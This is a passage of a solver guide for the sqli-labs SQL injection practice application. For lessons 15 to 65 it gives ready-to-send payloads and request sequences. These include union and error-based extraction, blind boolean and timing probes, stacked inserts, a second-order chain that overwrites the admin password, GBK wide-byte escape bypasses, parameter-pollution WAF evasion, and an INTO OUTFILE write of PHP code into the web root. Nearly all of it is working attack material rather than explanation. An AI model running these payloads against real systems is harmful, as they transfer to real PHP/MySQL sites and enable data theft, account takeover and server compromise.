* P1 (15, boolean): `uname=-1' or (ascii(substr(database(),1,1))>77)#` + any passwd → `flag.jpg` present when true,
  `slap.jpg` when false. Auth bypass for reference: `uname=admin'#`.
* P1 (16, boolean, parens): `uname=-1") or (ascii(substr(database(),1,1))>77)#`.
* Error markers: 11–14 print `mysql_error()` on the failure branch, so `XPATH syntax error` is usable for 11–14.
* Secondary step: none beyond the POST itself (no session/login).

### 4.6 Less-17 (POST Update-query injection)

* `check_input($_POST['uname'])` at `index.php:71` truncates to 15 chars, strips `magic_quotes`, wraps in quotes
  after `mysql_real_escape_string` → **uname is not injectable**.
* `$passwd=$_POST['passwd']` is raw; then:
  `UPDATE users SET password = '$passwd' WHERE username='$row1'` (`index.php:94`) — only executed when the
  initial `SELECT … WHERE username=$uname` returned a row, i.e. **`uname` must be an existing user** (`admin`).
* P1 (error): POST `uname=admin&passwd=' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '`
  → body has `XPATH syntax error: '~security~'` (and `../images/flag1.jpg` because the row existed).
* P2 boolean (do not use casually — it will overwrite admin's password):
  `passwd=' or '1'='1` … then the UPDATE succeeds and `admin`'s password becomes the payload.
* Secondary step: none, but the SELECT above must match an existing username.

### 4.7 Less-18 (User-Agent) / Less-19 (Referer) — header INSERT injections

Both: valid login POST required first (`uname`,`passwd` are `check_input`-escaped and non-injectable), then:
* 18 `index.php:103`: `INSERT INTO security.uagents (uagent, ip_address, username) VALUES ('$uagent', '$IP', $uname)`
  with `$uagent = $_SERVER['HTTP_USER_AGENT']` (`index.php:66`).
* 19 `index.php:103`: `INSERT INTO security.referers (referer, ip_address) VALUES ('$uagent', '$IP')`
  with `$uagent = $_SERVER['HTTP_REFERER']` (`index.php:66`).
The branch prints `Your User Agent is: …` / `Your Referer is: …`, then `print_r(mysql_error())` (active in both).
Request shape (18): `POST /Less-18/index.php`, body `uname=Dumb&passwd=Dumb&submit=Submit`,
header `User-Agent: ' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '`.
Request shape (19): same body, header
`Referer: ' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '`.
Markers: `XPATH syntax error: '~security~'` plus `Your User Agent is:` / `Your Referer is:`; row exists in
`security.uagents` / `security.referers` after success.
* Secondary step: **POST valid credentials first in the same request** (`uname=Dumb&passwd=Dumb`); header must be
  on the same HTTP request (headers cannot be set after the login step).

### 4.8 Less-20 / 21 / 22 — Cookie injections

The `else` branch runs whenever the `uname` cookie exists — **no login POST needed**; one GET with a crafted
cookie is enough (the login POST exists only to make the app set that cookie):

| Lesson | Cookie value decoded | SQL (`index.php`) | Break-out |
|---|---|---|---|
| 20 | plain text | `SELECT * FROM users WHERE username='$cookee' LIMIT 0,1` | `-1'` |
| 21 | `base64_decode` | `SELECT * FROM users WHERE username=('$cookee') LIMIT 0,1` | `-1')` |
| 22 | `base64_decode` then `$cookee1='"'...'"'` | `SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1` | `-1"` |

* P1 (union, 3 cols; page prints `Your Login name:`/`Your Password:`/`Your ID:`):
  * 20: `Cookie: uname=-1%27%20union%20select%201,database(),version()%23`
  * 21: payload `-1') union select 1,database(),version()#`, value = `urlencode(base64.b64encode(payload))`
  * 22: payload `-1" union select 1,database(),version()#`, value = `urlencode(base64.b64encode(payload))`
  (`urlencode` the base64 to protect `+`/`=`; PHP urldecodes cookie values before base64-decoding.)
* P2 (error): 20 `-1' and extractvalue(1,concat(0x7e,database(),0x7e))#`; 21/22 same with their quote context.
  These pages `die('Issue with your mysql: '.mysql_error())` on query error → marker `XPATH syntax error`.
* Marker: body contains `Your Login name:security`.
* Secondary step (optional natural flow): `POST index.php uname=admin&passwd=admin&submit=Submit` → 302 with
  `Set-Cookie: uname=admin` (21/22 base64) → then GET with the modified cookie. Not required.

### 4.9 Less-23 (error based, comments stripped)

* Filter (`index.php:25-27`): `$reg="/#/"; $reg1="/--/"; $id = preg_replace(...)` — removes **every** `#` and
  `--` substring from `id` (no case filter).
* `SELECT * FROM users WHERE id='$id' LIMIT 0,1`; 3 columns; `print_r(mysql_error())` active.
* P1 (error, needs no comment): `?id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e)) and '1'='1`
  → SQL `id='1' and extractvalue(...) and '1'='1' LIMIT 0,1`; marker `XPATH syntax error: '~security~'`.
* P2 (union, terminate with a tautology instead of a comment):
  `?id=-1' union select 1,database(),version() or '1'='1` → `Your Login name:security`.
* Do not send `#`/`--` — they are deleted and break the payload.

### 4.10 Less-24 (second-order injection — 4-request chain)

Files: `index.php` (login form, POST → `login.php`, fields `login_user`,`login_password`,`mysubmit`),
`new_user.php` (registration form → `login_create.php`, fields `username`,`password`,`re_password`,`submit`),
`logged-in.php` (POST → `pass_change.php`, fields `current_password`,`password`,`re_password`,`submit`;
logout `submit1`).
Injection: `login_create.php` escapes the new username for that INSERT only (`mysql_escape_string` + double-quoted
VALUES), so the stored value is the **raw** payload; `login.php` returns the stored username into
`$_SESSION["username"]`; `pass_change.php` then executes
`UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'`
with `$username` from the session, **unescaped** → second-order SQLi.

Exact sequence (keep one `requests.Session()`, cookies PHPSESSID + `Auth`):
1. `POST /Less-24/login_create.php` body
   `username=admin'%23&password=pwn&re_password=pwn&submit=Register`
   (i.e. username `admin'#`). Response contains `../images/Less-24-user-created.jpg` on success.
   If the user already exists the page silently refreshes to `new_user.php`; then just continue from step 2.
2. `POST /Less-24/login.php` body `login_user=admin'%23&login_password=pwn&mysubmit=Login`
   → 302 `Location: logged-in.php`; session now has username `admin'#`, cookie `Auth=1`.
3. `POST /Less-24/pass_change.php` body
   `current_password=x&password=newpass1&re_password=newpass1&submit=Reset`
   (cookies from step 2). `$username` = `admin'#` → `UPDATE … username='admin'#' and password='…'` → updates
   **admin**'s row. Success body contains `Password successfully updated`
   (it redirects to `failed.php` if `mysql_affected_rows()!=1` — pick a new password different from current).
4. Prove: `POST /Less-24/login.php` body `login_user=admin&login_password=newpass1&mysubmit=Login` → 302, then
   `GET /Less-24/logged-in.php` → body contains `YOU ARE LOGGED IN AS` + `admin`.
Notes: step 4 mutates shared state (admin's password). `parse_str`/`mysql_escape_string` cannot neutralise the
stored quote, which is exactly the point. If `output_buffering` is off, `Auth` setcookie in step 2 may fail —
supply `Cookie: Auth=1` manually on step 3.

### 4.11 Less-25 / 25a — `or`/`and` filter

Filter (identical both lessons, `blacklist()`):
`preg_replace('/or/i',"",$id); preg_replace('/AND/i',"",$id);` — deletes every `or`/`and` substring,
case-insensitive, anywhere.
* 25 template: `id='$id'` (string, error+union). 25a template: `id=$id` (integer, union; error text commented out,
  but row values are displayed).
* P1 (25): `?id=-1' union select 1,database(),version()-- ` (contains neither `or` nor `and`).
* P1 (25a): `?id=-1 union select 1,database(),version()-- `.
* If you must write a filtered identifier: double the removed letters, e.g. `passwoorrd` → `password`,
  `infoorrmation_schema` → `information_schema`; alternatively use operators `||` / `&&`.
* P2 (25 error): `?id=1'&&extractvalue(1,concat(0x7e,database(),0x7e))-- ` (`extractvalue` survives the filter).
* Marker: `Your Login name:security`; both lessons echo `Hint: Your Input is Filtered with following result: …`
  (useful to see exactly what the filter did).

### 4.12 Less-26 / 26a / 27 / 27a / 28 / 28a — space & comment filters

Exact filter chains (`blacklist()`):

* **26**: strips `or` (i), `and` (i), `/*`, `--`, `#`, **all whitespace `\s`**, `/` and `\`.
* **26a**: same as 26 (whitespace line duplicated).
* **27**: strips `/*`, `--`, `#`, `[ +]` (space **and plus**), `select`(lowercase, `/m`), `[ +]`, `union`,
  `select`, `UNION`, `SELECT`, `Union`, `Select`.
* **27a**: same list as 27.
* **28**: strips `/*`, `--`, `#`, `[ +]`, `[ +]`, then `union\s+select` (i). (`select` regex is commented out.)
* **28a**: only `union\s+select` (i) is active (all other lines commented out).

Payload rules: **26/26a/28** strip all whitespace → use parentheses as token separators; **27/27a** strip only
space and `+` → tabs (`%09`) and newlines (`%0A`) are usable, and `SeLeCt` must be mixed-case. Comments are
stripped in all six → close the trailing `'` with a tautology or swallow it inside a literal; **28** avoids the
`union\s+select` pattern by writing `union(select(...))`.

* **26** (`id='$id'`, error active): `?id=1'&&extractvalue(1,concat(0x7e,(select(database())),0x7e))&&'1'='1`
  → marker `XPATH syntax error`. (No space, no comment, no `or`/`and` substring.)
* **26a** (`id=('$id')`, error hidden → boolean row-display):
  `?id=1')&&(ascii(substr((select(database())),1,1))>77)&&('1'='1`
  → SQL `id=('1')&&(…)&&('1'='1') LIMIT 0,1`; `Your Login name:` present iff the condition is true.
* **27** (`id='$id'`, error active): `?id=1'&&extractvalue(1,concat(0x7e,(SeLeCt(database())),0x7e))&&'1'='1`
  (mixed case is mandatory for `SeLeCt`).
  Alternative tab/newline form (simpler tail handling): `?id=-1'%0AuNiOn%0AsElEcT%0A1,database(),version()%0AAND%0A'`
  → SQL `id='-1' UNION SELECT 1,database(),version() AND '' LIMIT 0,1`; marker `Your Login name:security`.
* **27a** (`id=$id` with `$id='"'...'"'`, error hidden → boolean):
  `?id=1"&&(ascii(substr((SeLeCt(database())),1,1))>77)&&"1"="1` → row-present oracle.
  Alternative tab/newline union: `?id=-1"%0AuNiOn%0AsElEcT%0A1,database(),version()%0AAND%0A"` → `Your Login name:security`.
* **28** (`id=('$id')`, error hidden, union display, no spaces/comments):
  `?id=-1')union(select(1),(select(database())),'`
  → SQL `… id=('-1')union(select(1),(select(database())),'') LIMIT 0,1`; the template's trailing `')` is consumed
  as `''` + paren. Result: `Your Login name:security`.
* **28a** (`id=('$id')`, only union-select filter, everything else allowed → comment ok):
  `?id=-1') union(select(1),database(),3)-- ` (`union(` has no whitespace → survives the regex).
* Secondary step: none. All six print `Hint: Your Input is Filtered with following result: …` echoing your
  filtered payload (good for debugging the filter).

### 4.13 Less-29 / 30 / 31 — WAF whitelist + HTTP Parameter Pollution

Canonical target is **`login.php`** (`index.php` in these three dirs has the same query but **no WAF**; use it only
as a fallback). `login.php` logic:

```php
$qs   = $_SERVER['QUERY_STRING'];
$id1  = java_implimentation($qs);   // take the FIRST "id=…" pair from the raw query string, substr(...,3,30)
$id   = $_GET['id'];                // PHP keeps the LAST duplicate value
whitelist($id1);                    // preg_match('/^\d+$/') else header('Location: hacked.php')
$sql  = …($id)…                      // injectable
```

`whitelist()` does **not** `exit`, but a non-numeric *first* id makes the client follow to `hacked.php`, so send a
numeric decoy first and the payload second (PHP: last parameter wins; Java servlet `getParameter` wraps the
first — that is the "impedance mismatch", see also `tomcat-files.zip` `Less-29/index.jsp`).

| Lesson | login.php template | Request |
|---|---|---|
| 29 | `id='$id'` (error active) | `GET /Less-29/login.php?id=1&id=-1' union select 1,database(),version()-- ` |
| 30 | `$id='"'.$id.'"'; id=$id` (error **active**) | `GET /Less-30/login.php?id=1&id=-1" union select 1,database(),version()-- ` |
| 31 | `$id='"'.$id.'"'; id=($id)` (error active) | `GET /Less-31/login.php?id=1&id=-1") union select 1,database(),version()-- ` |

* Use an ordered pair list (`params=[('id','1'),('id', payload)]`) so both params are sent in that order.
* Marker: `Your Login name:security`; the pages also echo `Hint: The Query String you input is: …`.
* Fallback without WAF: the same payload with a single `id` against `/Less-29/index.php` / `/Less-30/index.php` /
  `/Less-31/index.php` (`index.php` has the identical SQL template, no whitelist/HPP layer).
* All three `login.php` files print `mysql_error()` on failure, so error payloads also work: e.g. 29
  `?id=1&id=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- `; 30/31 use their own quote context.
* **Whitelist bug:** `whitelist()` sends `Location: hacked.php` but has **no `exit`**. If the first `id` is
  non-numeric you get a 302 whose body may still contain the injected output; either always send the numeric decoy
  first (cleanest) or use `allow_redirects=False` and read the 302 body.

### 4.14 Less-32 … Less-37 — addslashes / mysql_real_escape_string + GBK

All call `mysql_query("SET NAMES gbk")` immediately before the query, and `security` is a gbk database.
A payload quote must be preceded by a byte that forms a valid GBK lead/`0x5C` pair; the canonical is
`0xDF` (`%DF`), so `0xDF 0x27` → escape produces `0xDF 0x5C 0x27`; GBK reads `DF 5C` as one character and the
`0x27` remains a live quote.

| Lesson | Filter | Transport | Template |
|---|---|---|---|
| 32 | `check_addslashes()` re-invents addslashes (`\` → `\\`, `'`→`\'`, `"`→`\"`) | GET `id` | `id='$id'` |
| 33 | `addslashes($string)` | GET `id` | `id='$id'` |
| 34 | `addslashes()` on both fields | POST `uname` (or `passwd`), 2 cols | `username='$uname' and password='$passwd'` |
| 35 | `addslashes()` but integer context (filter irrelevant) | GET `id` | `id=$id` |
| 36 | `mysql_real_escape_string()` | GET `id` | `id='$id'` |
| 37 | `mysql_real_escape_string()` on both fields | POST `uname`, 2 cols | `username='$uname' and password='$passwd'` |

* P1 GET wide-byte (32/33/36): `?id=` + `b"-1\xdf' union select 1,database(),version()-- "` → `%DF%27` on the wire
  → body `Your Login name:security`.
* P1 POST wide-byte (34/37): `uname=` + `b"-1\xdf' union select database(),2#"`, `passwd=x` → `Your Login name:security`.
* P1 (35): `?id=-1 union select 1,database(),version()-- ` (no escaping can help an integer context).
* Error variants: `b"1\xdf' and extractvalue(1,concat(0x7e,database(),0x7e))-- "`.
* The pages echo the escaped input (`Hint: The Query String you input is escaped as …` and, for 32/33/36, its
  hex) — useful to confirm `%DF` arrived.
* Secondary step: none.

### 4.15 Less-38 / 39 / 40 / 41 — stacked queries + blind

`mysqli_multi_query` + `mysqli_store_result` used directly (no `sql-connect.php`); DB `security`.

| Lesson | Template | Error echo | Display |
|---|---|---|---|
| 38 | `id='$id'` | yes (`print_r(mysqli_error)`) | first row `Your Username is : <row1>` / `Your Password is : <row2>` |
| 39 | `id=$id` | yes | same |
| 40 | `id=('$id')` | no | first row `Your Username is : <row1>` / `Your Password is : <row2>` |
| 41 | `id=$id` | no | same (no else branch at all) |

* 38 P1 union: `?id=-1' union select 1,database(),version()-- ` → `Your Username is : security`.
  39 P1: `?id=-1 union select 1,database(),version()-- `.
* 38/39 P2 stacked proof: `?id=1' ; insert into users(id,username,password) values(100,'pwn','pwn')#`
  (39: `?id=1;insert …#`) then `GET ?id=100` → `Your Username is : pwn`. Pick a fresh id per attempt.
* 40 boolean (no error text): `?id=1') and (ascii(substr(database(),1,1))>77)-- ` → row present/absent.
  Stacked variant: `?id=1');insert into users(id,username,password) values(100,'pwn','pwn')#` then `?id=100`.
* 41 boolean: `?id=1 and (ascii(substr(database(),1,1))>77)-- `; stacked: `?id=1;insert into users(…)#` then `?id=100`.
* 40/41 are *labelled* blind, but the row branch still prints the fetched row (`printf("Your Username is : %s", $row[1])`)
  — a union payload such as `?id=-1') union select 1,database(),version()-- ` displays data exactly like 38/39, so
  no blind extraction is needed: marker `Your Username is : security`.
* Note: `mysqli_multi_query` returns false only if the **first** statement errors — so for 38/39 put any error
  payload in the first statement (`?id=1' and extractvalue(...)-- `) and never rely on the error of a stacked one.

### 4.16 Less-42 … Less-45 — POST login + stacked queries

`index.php` (login form, fields `login_user`, `login_password`, `mysubmit`) POSTs to **`login.php`**.
In `login.php`: `$username = mysqli_real_escape_string($con1, $_POST["login_user"])` (safe) but
`$password = $_POST["login_password"]` (**raw**), and the query is:

| Lesson | login.php SQL | Error echo |
|---|---|---|
| 42 | `SELECT * FROM users WHERE username='$username' and password='$password'` | yes (`print_r(mysqli_error)` in both multi_query/store_result failure branches) |
| 43 | `SELECT * FROM users WHERE username=('$username') and password=('$password')` | yes |
| 44 | same as 42 | **no** (branches empty) |
| 45 | same as 43 | **no** |

All four run it through `mysqli_multi_query` → stacked queries allowed.
Requests: `POST /Less-42/login.php` body `login_user=admin&login_password=<payload>&mysubmit=Login`.

* 42 P1 (error): payload `' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '` → marker
  `XPATH syntax error: '~security~'`.
* 43 P1 (error, parens): payload `') or extractvalue(1,concat(0x7e,(select database()),0x7e)) or ('`.
* 44 P1 (auth bypass, deterministic): payload `' or 1=1#` → query returns the first user row (index `row[1]`),
  session set, 302 to `logged-in.php`; then `GET /Less-44/logged-in.php` with the session cookies (and `Auth=1`
  if the Set-Cookie failed) → `YOU ARE LOGGED IN AS Dumb`.
* 45 P1: payload `') or 1=1#` → same login success path.
* 42–45 P2 (stacked proof, works also for the blind pair): payload
  `';insert into users(id,username,password) values(100,'pwn','pwn')#` (43/45: `');insert …#`)
  → then `POST login.php` with `login_user=pwn&login_password=pwn` → 302 to `logged-in.php`.
  For 42/43 the first statement (`username='admin' and password=''`) is valid/no-error so the insert executes.
* Secondary step: **POST to `login.php`** (not `index.php`); use a session for the follow-up `logged-in.php`.
  If `output_buffering=0`, manually send `Cookie: Auth=1` with the PHPSESSID.

### 4.17 Less-46 … Less-53 — ORDER BY clause injections (`sort`)

All use `?sort=`; the list of users is always rendered (unless the query errors), so the visible table is
`<td>id</td><td>username</td><td>password</td>`.

| Lesson | SQL | Error echo | Stacked | Oracle |
|---|---|---|---|---|
| 46 | `SELECT * FROM users ORDER BY $id` | yes | no | error |
| 47 | `… ORDER BY '$id'` | yes | no | error |
| 48 | `… ORDER BY $id` | no | no | row-present boolean / time |
| 49 | `… ORDER BY '$id'` | no | no | row-present boolean / time |
| 50 | `… ORDER BY $id` (mysqli multi) | yes (only if 1st stmt fails) | **yes** | error / stacked |
| 51 | `… ORDER BY '$id'` (mysqli multi) | yes (1st stmt) | **yes** | error / stacked |
| 52 | `… ORDER BY $id` (mysqli multi) | no | **yes** | stacked insert / time |
| 53 | `… ORDER BY '$id'` (mysqli multi) | no | **yes** | stacked insert / time |

* 46 P1: `?sort=1 and extractvalue(1,concat(0x7e,(select database()),0x7e))`
  (alt `?sort=extractvalue(1,concat(0x7e,(select database()),0x7e))`) → `XPATH syntax error: '~security~'`.
  "procedure analyse" variant also valid: `?sort=1 procedure analyse(extractvalue(1,concat(0x7e,(select database()),0x7e)),1)`.
* 47 P1: `?sort=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- `.
* 48 P1 (error-based boolean, fast): `?sort=1 and if((ascii(substr(database(),1,1))>77),1,extractvalue(1,concat(0x7e,database(),0x7e)))`
  → condition true ⇒ valid query ⇒ user rows rendered; false ⇒ error ⇒ no rows. (Time fallback:
  `?sort=1 and if(ascii(substr(database(),1,1))>77,sleep(2),0)` — note ORDER BY expressions are evaluated per
  row, so the delay is ≈rows×2 s.)
* 49 P1: `?sort=1' and if((ascii(substr(database(),1,1))>77),1,extractvalue(1,concat(0x7e,database(),0x7e)))-- `.
* 50 P1 (error in first statement): `?sort=extractvalue(1,concat(0x7e,(select database()),0x7e))` → error printed.
  P2 stacked: `?sort=1;insert into users(id,username,password) values(100,'pwn','pwn')#`, then `GET ?sort=1` →
  the rendered table contains `pwn`.
* 51 P1: `?sort=1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- `.
  P2 stacked: `?sort=1';insert into users(id,username,password) values(100,'pwn','pwn')#`, verify via `?sort=1`.
* 52 P1 (deterministic): `?sort=1;insert into users(id,username,password) values(100,'pwn','pwn')#` then
  `GET ?sort=1` → row `pwn` appears. (Alt time: `?sort=1;select if(ascii(substr(database(),1,1))>77,sleep(2),0)`.)
* 53 P1: `?sort=1';insert into users(id,username,password) values(100,'pwn','pwn')#` then `GET ?sort=1`.
* Note for 50–53: `mysqli_multi_query` returns true if the **first** statement succeeds, so a stacked insert is
  fine but a stacked error will not be printed. Verify stacked writes by a second request, not by error text.

### 4.18 Less-54 … Less-65 — Challenge series (shared `challenges` DB)

Common to all 12:
* Injection point: `SELECT * FROM security.users WHERE id=… LIMIT 0,1` (exact per-lesson quote context below),
  but the **objective is to dump the secret key from `challenges.<random_table>`**, which requires first dumping
  the random table name and secret column name from `information_schema`, then the 24-char key from row `id=1`.
* Table name `= (SELECT table_name FROM information_schema.tables WHERE table_schema='challenges' LIMIT 0,1)`.
* Secret column `= (SELECT column_name FROM information_schema.columns WHERE table_schema='challenges' AND table_name='<TBL>' ORDER BY ordinal_position LIMIT 2,1)`.
* Key `= (SELECT <COLSEC> FROM challenges.<TBL> WHERE id=1)` (24 chars, `A-Za-z0-9`).
* Submission: `POST /Less-N/index.php` body `answer_key=Submit&key=<KEY>`; success ⇒ body contains
  `images/Less-54-1.jpg`. Failure ⇒ `images/slap1.jpg`. The check itself is escaped (no injection).
* GET requests with `id` call `next_tryy()` (increments the shared `tryy` counter) and render
  `You have made : N of <times> attempts`. `times` = 10 (54), 14 (55–57), 5 (58–61), 130 (62–65).
  Reaching `tryy>=times+1` only prints a "Challenge Has Been Reset" warning + an HTTP **`Refresh:`** header to
  `setup-db-challenge.php` (a `Refresh` header, not `Location:` — normal HTTP clients do not follow it); there is no
  `exit`, the injected query is still executed, and the DB is **not** regenerated unless that setup URL is actually
  fetched. Source-confirmed: the attempt limit is **not enforced server-side**. If you do fetch it, table, column
  and key all change and every partial extraction is invalid. Plan to stay within budget anyway.
* The `challenge` cookie is only the `sessid` md5 (irrelevant to solving).
* Do not let a client follow the Refresh after a successful submission if you still need the key (it regenerates
  table/column/key); or just be aware the key changes after a real reset.
* Cross-check: `GET /sql-connections/test.php` leaks the key directly (§1.5) — fastest route if present.

Exact per-lesson contexts / union payloads (3 columns; values shown in `Your Login name:` = col 2):

| Lesson | Template | UNION payload (GET) |
|---|---|---|
| 54 | `id='$id'` | `?id=-1' union select 1,(select table_name from information_schema.tables where table_schema='challenges' limit 0,1),3-- ` |
| 55 | `id=($id)` | `?id=-1) union select 1,(select table_name …),3-- ` |
| 56 | `id=('$id')` | `?id=-1') union select 1,(select table_name …),3-- ` |
| 57 | `$id='"'.$id.'"'; id=$id` | `?id=-1" union select 1,(select table_name …),3-- ` |

Then substitute `(select column_name from information_schema.columns where table_schema='challenges' and table_name='<TBL>' order by ordinal_position limit 2,1)`
and finally `(select <COLSEC> from challenges.<TBL> where id=1)` → POST the key.
(54–57 print `Your Login name:` with no space before the colon.)

*Budget-efficient 2-request plan (54–57):* request 1 returns both identifiers at once — col2 =
`(select table_name from information_schema.tables where table_schema='challenges' limit 0,1)`, col3 =
`(select column_name from information_schema.columns where table_schema='challenges' order by ordinal_position limit 2,1)`;
request 2 replaces col2/col3 with the key (`select <COLSEC> from <TBL> where id=1`). Then POST the key. That is 2 of
the 10/14 allowed requests. Same trick for 58–61 with `extractvalue`: `concat(0x7e,(table_name…),0x3a,(column_name…),0x7e)`
is ≤24 chars, then one more error payload for the 24-char key.

58–61 (display is a **fixed array** keyed by `$row['id']`, so union cannot leak; error text **is** printed):

| Lesson | Template | Error payload (first request) |
|---|---|---|
| 58 | `id='$id'` | `?id=-1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='challenges' limit 0,1),0x7e))-- ` |
| 59 | `id=$id` | `?id=-1 and extractvalue(1,concat(0x7e,(select table_name …),0x7e))-- ` |
| 60 | `id=("$id")` (`$id='("'…'")'`) | `?id=-1") and extractvalue(1,concat(0x7e,(select table_name …),0x7e))-- ` |
| 61 | `id=(('$id'))` | `?id=-1')) and extractvalue(1,concat(0x7e,(select table_name …),0x7e))#` |

Marker: `XPATH syntax error: '~<value>~'`. Repeat for the column name and the key (key 24 chars: keep each error
string ≤32 chars — split as `substr(<KEY>,1,16)` and `substr(<KEY>,17,8)` if the server truncates).
The XPath error trick equals the intended "double query" trick; alternative:
`?id=-1' and (select 1 from (select count(*),concat((select table_name …),floor(rand(0)*2))x from information_schema.tables group by x)a)-- `
→ `Duplicate entry '<value>1' for key 'group_key'`.
Note 58–61 still print `Your Login name : ` (space before colon) from the fixed array when a row is found.

62–65 (fixed-array display and error text commented out → **boolean blind**; the `Your Login name : ` string is
the oracle):

| Lesson | Template | Boolean probe (row present iff condition true) |
|---|---|---|
| 62 | `id=('$id')` | `?id=1') and (ascii(substr((<subquery>),<pos>,1))>77)#` |
| 63 | `id='$id'` | `?id=1' and (ascii(substr((<subquery>),<pos>,1))>77)#` |
| 64 | `id=(($id))` | `?id=1)) and (ascii(substr((<subquery>),<pos>,1))>77)#` |
| 65 | `id=("$id")` (`$id='"'…'"'`) | `?id=1") and (ascii(substr((<subquery>),<pos>,1))>77)#` |

Binary-search ASCII per character to extract table name (10 chars), column name (11 chars) and key (24 chars).
Marker: `Your Login name : ` present vs absent. A pure 1-bit oracle needs ≈45 characters × ~7 requests ≈ **315
requests > the nominal 130**, but §4.18 shows the limit is only a client-supplied `Refresh:` header and is not
enforced server-side, so a non-following client can run 315+ requests against the same table. Unauthenticated
side channels (below, in order of preference) also remove the need for blind extraction.
Side channels for 62–65 (in order of preference):
1. `GET /sql-connections/test.php` (§1.5) — if present, key is printed.
2. `UNION … INTO OUTFILE` as "secondary channel extraction" (README item 12), e.g.
   `?id=-1') union select 1,(select table_name from information_schema.tables where table_schema='challenges'),3 into outfile '/var/www/html/Less-62/out.txt'#`
   then `GET /Less-62/out.txt`; repeat for column name and key. Requires FILE privilege, a writable web root,
   and a real docroot path — **needs live verification**. (`LOAD_FILE` can be used with the same boolean oracle
   to probe candidate paths: `and length(load_file('/var/www/html/Less-62/index.php'))>0`.)
3. Time-encoded single-character oracle:
   `?id=1' and if(1,(select sleep(ascii(substr((<subquery>),<pos>,1))/10)),0)#` — duration encodes the char
   (≈0.1 s per ASCII code); 1 request per character.

---

## 5. Compact summary table (all 69 lesson dirs; §6 gaps and §7 solver fast-path follow)

| Lesson | Type | Request | Primary payload | Success marker |
|---|---|---|---|---|
| 1 | union/error `'` | GET `/Less-1/index.php?id=` | `-1' union select 1,database(),version()-- ` | `Your Login name:security` |
| 2 | union/error int | GET `/Less-2/index.php?id=` | `-1 union select 1,database(),version()-- ` | `Your Login name:security` |
| 3 | union/error `('` | GET `/Less-3/index.php?id=` | `-1') union select 1,database(),version()-- ` | `Your Login name:security` |
| 4 | union/error `("` | GET `/Less-4/index.php?id=` | `-1") union select 1,database(),version()-- ` | `Your Login name:security` |
| 5 | error `'` | GET `/Less-5/index.php?id=` | `1' and extractvalue(1,concat(0x7e,(select database()),0x7e))-- ` | `XPATH syntax error: '~security~'` |
| 6 | error `"` | GET `/Less-6/index.php?id=` | `1" and extractvalue(1,concat(0x7e,(select database()),0x7e))-- ` | `XPATH syntax error` |
| 7 | outfile / bool | GET `/Less-7/index.php?id=` | `-1')) union select 1,2,'<?php echo "pwned"; ?>' into outfile '/var/www/html/Less-7/out.php'-- ` | GET out.php → `pwned`; bool fallback text |
| 8 | bool `'` | GET `/Less-8/index.php?id=` | `1' and ascii(substr(database(),1,1))>77-- ` | `You are in...........` present/absent |
| 9 | time `'` | GET `/Less-9/index.php?id=` | `1' and if(ascii(substr(database(),1,1))>77,sleep(2),0)-- ` | response delay |
| 10 | time `"` | GET `/Less-10/index.php?id=` | `1" and if(ascii(substr(database(),1,1))>77,sleep(2),0)-- ` | response delay |
| 11 | POST union `'` | POST `/Less-11/index.php` `uname`,`passwd` | `uname=-1' union select 1,database()#` | `Your Login name:1` / `Your Password:security` |
| 12 | POST union `("` | POST `/Less-12/index.php` | `uname=-1") union select 1,database()#` | same |
| 13 | POST error `('` | POST `/Less-13/index.php` | `uname=1') and extractvalue(1,concat(0x7e,(select database()),0x7e))#` | `XPATH syntax error` |
| 14 | POST error `"` | POST `/Less-14/index.php` | `uname=1" and extractvalue(1,concat(0x7e,(select database()),0x7e))#` | `XPATH syntax error` |
| 15 | POST bool `'` | POST `/Less-15/index.php` | `uname=-1' or (ascii(substr(database(),1,1))>77)#` | `flag.jpg` vs `slap.jpg` |
| 16 | POST bool `("` | POST `/Less-16/index.php` | `uname=-1") or (ascii(substr(database(),1,1))>77)#` | `flag.jpg` vs `slap.jpg` |
| 17 | UPDATE error | POST `/Less-17/index.php` `uname=admin` | `passwd=' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '` | `XPATH syntax error` |
| 18 | UA insert error | POST `/Less-18/index.php` + UA header | `' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '` | `XPATH syntax error` |
| 19 | Referer insert error | POST `/Less-19/index.php` + Referer | `' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '` | `XPATH syntax error` |
| 20 | cookie union `'` | GET `/Less-20/index.php` Cookie `uname` | `-1' union select 1,database(),version()#` | `Your Login name:security` |
| 21 | cookie union b64 `('` | GET `/Less-21/index.php` Cookie base64 | `-1') union select 1,database(),version()#` | `Your Login name:security` |
| 22 | cookie union b64 `"` | GET `/Less-22/index.php` Cookie base64 | `-1" union select 1,database(),version()#` | `Your Login name:security` |
| 23 | union/error no comments | GET `/Less-23/index.php?id=` | `-1' union select 1,database(),version() or '1'='1` | `Your Login name:security` |
| 24 | second order | POST login_create → login → pass_change → login | username `admin'#`, pass_change `password=newpass1` | `Password successfully updated`, then `YOU ARE LOGGED IN AS admin` |
| 25 | union, or/and filtered | GET `/Less-25/index.php?id=` | `-1' union select 1,database(),version()-- ` | `Your Login name:security` |
| 25a | union int, filtered | GET `/Less-25a/index.php?id=` | `-1 union select 1,database(),version()-- ` | `Your Login name:security` |
| 26 | error, space filtered | GET `/Less-26/index.php?id=` | `1'&&extractvalue(1,concat(0x7e,(select(database())),0x7e))&&'1'='1` | `XPATH syntax error` |
| 26a | bool parens, filtered | GET `/Less-26a/index.php?id=` | `1')&&(ascii(substr((select(database())),1,1))>77)&&('1'='1` | `Your Login name:` present/absent |
| 27 | error, select filtered | GET `/Less-27/index.php?id=` | `1'&&extractvalue(1,concat(0x7e,(SeLeCt(database())),0x7e))&&'1'='1` | `XPATH syntax error` |
| 27a | bool DQ, filtered | GET `/Less-27a/index.php?id=` | `1"&&(ascii(substr((SeLeCt(database())),1,1))>77)&&"1"="1` | `Your Login name:` present/absent |
| 28 | union, union-select filtered | GET `/Less-28/index.php?id=` | `-1')union(select(1),(select(database())),'` | `Your Login name:security` |
